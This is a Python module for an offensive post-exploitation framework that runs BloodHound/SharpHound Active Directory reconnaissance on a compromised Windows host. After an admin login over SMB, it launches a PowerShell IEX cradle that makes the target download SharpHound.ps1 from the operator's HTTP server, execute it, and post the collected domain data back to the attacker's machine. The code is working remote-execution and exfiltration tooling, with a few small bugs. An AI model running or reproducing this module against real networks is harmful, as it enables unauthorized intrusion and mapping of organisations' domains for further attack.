from cmx.helpers.powershell import *
from cmx.helpers.misc import validate_ntlm
from cmx.helpers.logger import write_log
from sys import exit

class CMXModule:
    '''
        Executes the BloodHound recon script on the target and retreives the results onto the attackers' machine
        Original Module by Waffle-Wrath
        Updated by @awsmhacks
        Bloodhound.ps1 script base : https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1
    '''

    name = 'bloodhound'
    description = 'Executes the BloodHound recon script on the target and retreives the results to the attackers\' machine'
    supported_protocols = ['smb']
    opsec_safe= False
    multiple_hosts = False

    def options(self, context, module_options):
        '''
        THREADS             Max numbers of threads to execute on target (defaults to 20)
        COLLECTIONMETHOD    Method used by BloodHound ingestor to collect data (defaults to 'Default')
        OUTPUT              (optional) Path where csv files will be written on target (defaults to C:\temp)
        ZIPNAME

Check https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1 for options
Or consider using bloodhound.py ~ https://github.com/fox-it/BloodHound.py

        '''

        self.threads = 20
        self.output_path = 'C:\\temp'
        self.collection_method = 'Default'
        self.zip_name = "cmx.zip"

        if module_options and 'THREADS' in module_options:
            self.threads = module_options['THREADS']
        if module_options and 'OUTPUT' in module_options:
            self.csv_path = module_options['OUTPUT']
        if module_options and 'COLLECTIONMETHOD' in module_options:
            self.collection_method = module_options['COLLECTIONMETHOD']
        if module_options and 'ZIPNAME' in module_options:
            self.zip_name = module_options['ZIPNAME']

        self.ps_script = clean_ps_script('powershell_scripts/SharpHound.ps1')

    def on_admin_login(self, context, connection):
        command = 'Invoke-BloodHound -Threads {} -CollectionMethod {} -ZipFileName {}'.format(self.threads, self.collection_method, self.zip_name)
        launcher = gen_ps_iex_cradle(context, 'SharpHound.ps1', command)
        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'SharpHound.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            request.wfile.write(self.ps_script)
            context.log.success('Executing payload... this can take a few minutes...')
        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)
        response.stop_tracking_host()

        self.get_ouput(data, context, response)
        context.log.success("Successfully retreived data")

    def get_ouput(self, data, context, response):
        '''
        Grab the output from Invoke-BloodHound
        '''

        log_name = '{}-{}-{}'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"), self.zip_name)
        
        context.log.info("Saved output to {}".format(log_name))
